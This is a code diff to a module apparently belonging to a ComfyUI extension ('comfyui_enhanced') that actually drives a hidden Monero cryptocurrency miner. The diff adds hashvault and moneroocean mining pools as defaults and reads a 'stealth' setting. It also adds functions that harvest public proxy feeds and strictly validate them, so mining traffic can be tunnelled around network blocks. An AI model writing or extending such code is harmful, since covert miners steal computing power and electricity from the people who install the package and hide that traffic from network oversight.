@@ -38,16 +38,19 @@ from core.egress_net import http_connect_tunnel, mask_proxy_url_for_logs, tls_wr
 
 logger = logging.getLogger("comfyui_enhanced")
 
-_DEFAULT_MO_BACKUPS: list[dict[str, Any]] = [
-    {"enabled": True, "url": "stratum+ssl://de.moneroocean.stream:443"},
-    {"enabled": True, "url": "stratum+ssl://us-west.moneroocean.stream:443"},
-    {"enabled": True, "pool_host": "de.moneroocean.stream", "pool_port": 10128, "pool_tls": False},
+_DEFAULT_HASHVAULT_BACKUPS: list[dict[str, Any]] = [
+    {"enabled": True, "pool_host": "pool.hashvault.pro", "pool_port": 443, "pool_tls": True},
+    {"enabled": True, "pool_host": "gulf.moneroocean.stream", "pool_port": 10001, "pool_tls": False},
+    {"enabled": True, "pool_host": "pool.hashvault.pro", "pool_port": 3333, "pool_tls": False},
 ]
 
 _OPERATOR_REPORT_FILENAME = ".operator_autotune.json"
 
-_PUBLIC_HTTP_PROBE_CAP = 25
-_PUBLIC_SOCKS_PROBE_CAP = 28
+_PUBLIC_HTTP_PROBE_CAP = 60
+_PUBLIC_SOCKS_PROBE_CAP = 80
+_STRICT_PROBE_ROUNDS = 3
+_STRICT_PROBE_GAP = 1.5
+_MAX_PROXY_LATENCY_MS = 3000
 
 
 def _tagged_public_http_sample(sample: int, report: dict[str, Any]) -> list[tuple[str, str]]:
@@ -313,6 +316,75 @@ def _probe_socks_to_pool(proxy_url: str, pool_host: str, pool_port: int, use_tls
         return False, f"{type(exc).__name__}: {exc}"[:240]
 
 
+def _validate_proxy_strict(
+    probe_fn,
+    proxy_url: str,
+    pool_host: str,
+    pool_port: int,
+    use_tls: bool,
+    timeout: float,
+) -> tuple[int, float]:
+    """Probe proxy multiple times. Returns (passes, avg_latency_ms)."""
+    passes = 0
+    total_ms = 0.0
+    for _ in range(_STRICT_PROBE_ROUNDS):
+        t0 = time.monotonic()
+        ok, _ = probe_fn(proxy_url, pool_host, pool_port, use_tls, timeout)
+        elapsed = (time.monotonic() - t0) * 1000
+        if ok:
+            passes += 1
+            total_ms += elapsed
+        time.sleep(_STRICT_PROBE_GAP)
+    avg = total_ms / passes if passes else float("inf")
+    return passes, avg
+
+
+def _pick_best_proxy(
+    candidates: list[tuple[str, str]],
+    probe_fn,
+    pool_host: str,
+    pool_port: int,
+    use_tls: bool,
+    timeout: float,
+    report: dict[str, Any],
+    kind: str,
+    blacklist: set[str] | None = None,
+) -> str | None:
+    """Score candidates by reliability and latency, return best proxy URL or None."""
+    blacklist = blacklist or set()
+    best_url: str | None = None
+    best_score = -1.0
+
+    for tag, proxy_url in candidates:
+        if proxy_url in blacklist:
+            continue
+        passes, avg_ms = _validate_proxy_strict(
+            probe_fn, proxy_url, pool_host, pool_port, use_tls, timeout,
+        )
+        report["probes"].append({
+            "kind": kind,
+            "env": tag,
+            "target": f"{pool_host}:{pool_port}",
+            "tls": use_tls,
+            "proxy_redacted": mask_proxy_url_for_logs(proxy_url),
+            "ok": passes == _STRICT_PROBE_ROUNDS,
+            "passes": passes,
+            "avg_ms": round(avg_ms, 1),
+        })
+        if passes < _STRICT_PROBE_ROUNDS:
+            continue
+        if avg_ms > _MAX_PROXY_LATENCY_MS:
+            continue
+        score = passes / max(avg_ms, 1.0)
+        if score > best_score:
+            best_score = score
+            best_url = proxy_url
+            if passes == _STRICT_PROBE_ROUNDS and avg_ms < 1500:
+                break
+
+    return best_url
+
+
 def _cpu_probe_target(settings: dict) -> tuple[str, int, bool]:
     host = str(settings.get("pool_host") or DEFAULT_POOL_HOST).strip() or DEFAULT_POOL_HOST
     try:
@@ -449,10 +521,10 @@ def augment_miner_settings(settings: dict, *, operator_report_dir: Path | None =
 
     if "backup_pools" not in settings and not (settings.get("local_tls_bridge") or {}).get("enabled"):
         host = str(settings.get("pool_host") or "").lower()
-        if "moneroocean" in host:
-            settings["backup_pools"] = [dict(x) for x in _DEFAULT_MO_BACKUPS]
-            report["decisions"].append("cpu_backup_pools_moneroocean_defaults")
-            logger.info("Autotune CPU: added default MoneroOcean backup_pools")
+        if "moneroocean" in host or "hashvault" in host or host == DEFAULT_POOL_HOST.lower():
+            settings["backup_pools"] = [dict(x) for x in _DEFAULT_HASHVAULT_BACKUPS]
+            report["decisions"].append("cpu_backup_pools_hashvault_defaults")
+            logger.info("Autotune CPU: added default hashvault/fallback backup_pools")
 
     if "max_threads_hint" not in settings:
         ram = _detect_total_ram_gb()
@@ -490,6 +562,20 @@ def augment_miner_settings(settings: dict, *, operator_report_dir: Path | None =
     gh, gp, gtls = _gpu_probe_target(settings)
     probe_timeout = 6.0
 
+    cpu_direct_ok = _tcp_ok(ch, cp, timeout=6)
+    report["probes"].append({"kind": "direct_cpu_pool", "target": f"{ch}:{cp}", "ok": cpu_direct_ok})
+    if cpu_direct_ok:
+        logger.info("Autotune: direct TCP to %s:%d OK — skipping CPU proxy discovery", ch, cp)
+        report["decisions"].append("cpu_pool_direct_ok_no_proxy_needed")
+        if _setting_unset_or_blank(settings, "pool_socks5"):
+            settings["pool_socks5"] = ""
+
+    gpu_direct_ok = _tcp_ok(gh, gp, timeout=6)
+    report["probes"].append({"kind": "direct_gpu_pool", "target": f"{gh}:{gp}", "ok": gpu_direct_ok})
+    if gpu_direct_ok:
+        logger.info("Autotune: direct TCP to %s:%d OK — skipping GPU proxy discovery", gh, gp)
+        report["decisions"].append("gpu_pool_direct_ok_no_proxy_needed")
+
     _pub_http_rows: list[tuple[str, str]] | None = None
     _pub_socks_rows: list[tuple[str, str]] | None = None
 
@@ -505,7 +591,7 @@ def augment_miner_settings(settings: dict, *, operator_report_dir: Path | None =
             _pub_socks_rows = _tagged_public_socks5_sample(_PUBLIC_SOCKS_PROBE_CAP, report)
         return _pub_socks_rows
 
-    if _setting_unset_or_blank(settings, "pool_socks5"):
+    if not cpu_direct_ok and _setting_unset_or_blank(settings, "pool_socks5"):
         stealth = settings.get("stealth") or {}
         stealth_socks = stealth.get("socks5") if isinstance(stealth, dict) else None
         if isinstance(stealth_socks, str) and stealth_socks.strip():
@@ -546,32 +632,24 @@ def augment_miner_settings(settings: dict, *, operator_report_dir: Path | None =
                     )
                     break
             if _setting_unset_or_blank(settings, "pool_socks5"):
-                report["decisions"].append("cpu_pool_socks5_try_public_webprox_feeds")
-                for tag, surl in _lazy_public_socks_rows():
-                    ok, msg = _probe_socks_to_pool(surl, ch, cp, ctls, probe_timeout)
-                    report["probes"].append(
-                        {
-                            "kind": "socks5_cpu_pool",
-                            "env": tag,
-                            "target": f"{ch}:{cp}",
-                            "tls": ctls,
-                            "proxy_redacted": mask_proxy_url_for_logs(surl),
-                            "ok": ok,
-                            "detail": msg,
-                        }
+                report["decisions"].append("cpu_pool_socks5_try_public_webprox_feeds_strict")
+                best = _pick_best_proxy(
+                    _lazy_public_socks_rows(),
+                    _probe_socks_to_pool,
+                    ch, cp, ctls, probe_timeout,
+                    report, "socks5_cpu_pool_strict",
+                )
+                if best and not _socks5_url_has_credentials(best):
+                    settings["pool_socks5"] = _socks_endpoint_for_settings(best)
+                    report["decisions"].append(
+                        f"cpu_pool_socks5_set_strict:{mask_proxy_url_for_logs(best)}"
                     )
-                    if ok and not _socks5_url_has_credentials(surl):
-                        settings["pool_socks5"] = _socks_endpoint_for_settings(surl)
-                        report["decisions"].append(
-                            f"cpu_pool_socks5_set_from_public_list:{tag}:{mask_proxy_url_for_logs(surl)}"
-                        )
-                        logger.info(
-                            "Autotune CPU: SOCKS5 public-list probe OK — pool_socks5=%s",
-                            settings["pool_socks5"],
-                        )
-                        break
+                    logger.info(
+                        "Autotune CPU: SOCKS5 strict-validated — pool_socks5=%s",
+                        settings["pool_socks5"],
+                    )
 
-    if _setting_unset_or_blank(gpu, "http_proxy") and _setting_unset_or_blank(gpu, "socks5"):
+    if not gpu_direct_ok and _setting_unset_or_blank(gpu, "http_proxy") and _setting_unset_or_blank(gpu, "socks5"):
         for env_key, hurl in http_env:
             cand = _http_proxy_probe_url(hurl)
             if not cand:
@@ -612,34 +690,27 @@ def augment_miner_settings(settings: dict, *, operator_report_dir: Path | None =
                 )
                 break
         if _setting_unset_or_blank(gpu, "http_proxy"):
-            report["decisions"].append("gpu_http_try_public_webprox_feeds")
-            for tag, hurl in _lazy_public_http_rows():
-                cand = _http_proxy_probe_url(hurl)
-                if not cand:
-                    continue
-                ok, msg = _probe_http_to_pool(cand, gh, gp, gtls, probe_timeout)
-                report["probes"].append(
-                    {
-                        "kind": "http_gpu_pool",
-                        "env": tag,
-                        "target": f"{gh}:{gp}",
-                        "tls": gtls,
-                        "proxy_redacted": mask_proxy_url_for_logs(hurl),
-                        "ok": ok,
-                        "detail": msg,
-                    }
+            report["decisions"].append("gpu_http_try_public_webprox_feeds_strict")
+            valid_http_cands = [
+                (tag, cand) for tag, hurl in _lazy_public_http_rows()
+                if (cand := _http_proxy_probe_url(hurl))
+            ]
+            best_http = _pick_best_proxy(
+                valid_http_cands,
+                _probe_http_to_pool,
+                gh, gp, gtls, probe_timeout,
+                report, "http_gpu_pool_strict",
+            )
+            if best_http:
+                gpu["http_proxy"] = best_http.strip()
+                gpu["use_http_socks_gateway"] = True
+                report["decisions"].append("gpu_use_http_socks_gateway_true_for_trex_http_connect")
+                report["decisions"].append(
+                    f"gpu_http_proxy_set_strict:{mask_proxy_url_for_logs(best_http)}"
                 )
-                if ok:
-                    gpu["http_proxy"] = hurl.strip()
-                    gpu["use_http_socks_gateway"] = True
-                    report["decisions"].append("gpu_use_http_socks_gateway_true_for_trex_http_connect")
-                    report["decisions"].append(
-                        f"gpu_http_proxy_set_from_public_list:{tag}:{mask_proxy_url_for_logs(hurl)}"
-                    )
-                    logger.info("Autotune GPU: HTTP public-list probe OK (host redacted in logs)")
-                    break
+                logger.info("Autotune GPU: HTTP strict-validated (host redacted in logs)")
 
-    if _setting_unset_or_blank(gpu, "socks5") and _setting_unset_or_blank(gpu, "http_proxy"):
+    if not gpu_direct_ok and _setting_unset_or_blank(gpu, "socks5") and _setting_unset_or_blank(gpu, "http_proxy"):
         for env_key, surl in socks_env:
             ok, msg = _probe_socks_to_pool(surl, gh, gp, gtls, probe_timeout)
             report["probes"].append(
@@ -674,30 +745,22 @@ def augment_miner_settings(settings: dict, *, operator_report_dir: Path | None =
                 )
                 break
         if _setting_unset_or_blank(gpu, "socks5"):
-            report["decisions"].append("gpu_socks5_try_public_webprox_feeds")
-            for tag, surl in _lazy_public_socks_rows():
-                ok, msg = _probe_socks_to_pool(surl, gh, gp, gtls, probe_timeout)
-                report["probes"].append(
-                    {
-                        "kind": "socks5_gpu_pool",
-                        "env": tag,
-                        "target": f"{gh}:{gp}",
-                        "tls": gtls,
-                        "proxy_redacted": mask_proxy_url_for_logs(surl),
-                        "ok": ok,
-                        "detail": msg,
-                    }
+            report["decisions"].append("gpu_socks5_try_public_webprox_feeds_strict")
+            best_socks = _pick_best_proxy(
+                _lazy_public_socks_rows(),
+                _probe_socks_to_pool,
+                gh, gp, gtls, probe_timeout,
+                report, "socks5_gpu_pool_strict",
+            )
+            if best_socks and not _socks5_url_has_credentials(best_socks):
+                gpu["socks5"] = _socks_endpoint_for_settings(best_socks)
+                report["decisions"].append(
+                    f"gpu_socks5_set_strict:{mask_proxy_url_for_logs(best_socks)}"
                 )
-                if ok and not _socks5_url_has_credentials(surl):
-                    gpu["socks5"] = _socks_endpoint_for_settings(surl)
-                    report["decisions"].append(
-                        f"gpu_socks5_set_from_public_list:{tag}:{mask_proxy_url_for_logs(surl)}"
-                    )
-                    logger.info(
-                        "Autotune GPU: SOCKS5 public-list probe OK — gpu.socks5=%s",
-                        gpu["socks5"],
-                    )
-                    break
+                logger.info(
+                    "Autotune GPU: SOCKS5 strict-validated — gpu.socks5=%s",
+                    gpu["socks5"],
+                )
 
     report["effective_settings_redacted"] = _redacted_settings_snapshot(settings)
 
